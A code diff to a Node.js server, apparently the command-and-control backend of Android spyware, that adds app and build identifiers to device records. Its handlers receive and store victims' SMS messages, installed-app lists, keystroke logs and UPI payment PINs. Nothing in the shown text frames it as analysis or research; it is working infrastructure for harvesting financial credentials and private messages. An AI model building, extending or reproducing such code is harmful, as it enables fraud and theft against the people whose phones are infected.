@@ -53,13 +53,17 @@ async function flushHeartbeats() {
                     update: {
                         last_seen: data.last_seen,
                         status: data.status,
-                        heartbeat: data.heartbeat
+                        heartbeat: data.heartbeat,
+                        app_id: data.app_id,
+                        build_id: data.build_id
                     },
                     create: {
                         device_id: dId,
                         last_seen: data.last_seen,
                         status: data.status,
-                        heartbeat: data.heartbeat
+                        heartbeat: data.heartbeat,
+                        app_id: data.app_id,
+                        build_id: data.build_id
                     }
                 });
             }),
@@ -89,6 +93,8 @@ setInterval(flushHeartbeats, HEARTBEAT_FLUSH_INTERVAL);
 
 function setupTelemetryHandlers(socket, io, notifyChange) {
     const deviceId = socket.deviceId;
+    const appId = socket.appId;
+    const buildId = socket.buildId;
 
     // Sync SMS
     socket.on('sync_sms', async (data, ack) => {
@@ -120,8 +126,18 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
             await prisma.$transaction([
                 prisma.device.upsert({
                     where: { device_id: deviceId },
-                    update: { last_seen: new Date() },
-                    create: { device_id: deviceId, last_seen: new Date(), status: true }
+                    update: {
+                        last_seen: new Date(),
+                        app_id: appId,
+                        build_id: buildId
+                    },
+                    create: {
+                        device_id: deviceId,
+                        last_seen: new Date(),
+                        status: true,
+                        app_id: appId,
+                        build_id: buildId
+                    }
                 }),
                 ...validMessages.map(msg => {
                     const dId = getVal(msg, 'device_id', 'deviceId');
@@ -186,8 +202,18 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                 await prisma.$transaction([
                     prisma.device.upsert({
                         where: { device_id: deviceId },
-                        update: { last_seen: new Date() },
-                        create: { device_id: deviceId, last_seen: new Date(), status: true }
+                        update: {
+                            last_seen: new Date(),
+                            app_id: appId,
+                            build_id: buildId
+                        },
+                        create: {
+                            device_id: deviceId,
+                            last_seen: new Date(),
+                            status: true,
+                            app_id: appId,
+                            build_id: buildId
+                        }
                     }),
                     prisma.smsMessage.upsert({
                         where: { device_id_local_sms_id: { device_id: msgDeviceId, local_sms_id: localSmsId } },
@@ -240,8 +266,18 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
             await prisma.$transaction([
                 prisma.device.upsert({
                     where: { device_id: deviceId },
-                    update: { last_seen: new Date() },
-                    create: { device_id: deviceId, last_seen: new Date(), status: true }
+                    update: {
+                        last_seen: new Date(),
+                        app_id: appId,
+                        build_id: buildId
+                    },
+                    create: {
+                        device_id: deviceId,
+                        last_seen: new Date(),
+                        status: true,
+                        app_id: appId,
+                        build_id: buildId
+                    }
                 }),
                 ...validApps.map(app => {
                     const packageName = getVal(app, 'package_name', 'packageName');
@@ -315,7 +351,9 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
             deviceUpdateBuffer.set(deviceId, {
                 last_seen: new Date(),
                 status: (h.status !== undefined) ? Boolean(h.status) : true,
-                heartbeat: h
+                heartbeat: h,
+                app_id: appId,
+                build_id: buildId
             });
 
             socket.emit('heartbeat_ack');
@@ -337,8 +375,18 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                 await prisma.$transaction([
                     prisma.device.upsert({
                         where: { device_id: deviceId },
-                        update: { last_seen: new Date() },
-                        create: { device_id: deviceId, last_seen: new Date(), status: true }
+                        update: {
+                            last_seen: new Date(),
+                            app_id: appId,
+                            build_id: buildId
+                        },
+                        create: {
+                            device_id: deviceId,
+                            last_seen: new Date(),
+                            status: true,
+                            app_id: appId,
+                            build_id: buildId
+                        }
                     }),
                     prisma.keyLog.create({
                         data: {
@@ -369,8 +417,18 @@ function setupTelemetryHandlers(socket, io, notifyChange) {
                 await prisma.$transaction([
                     prisma.device.upsert({
                         where: { device_id: deviceId },
-                        update: { last_seen: new Date() },
-                        create: { device_id: deviceId, last_seen: new Date(), status: true }
+                        update: {
+                            last_seen: new Date(),
+                            app_id: appId,
+                            build_id: buildId
+                        },
+                        create: {
+                            device_id: deviceId,
+                            last_seen: new Date(),
+                            status: true,
+                            app_id: appId,
+                            build_id: buildId
+                        }
                     }),
                     prisma.upiPin.create({
                         data: {
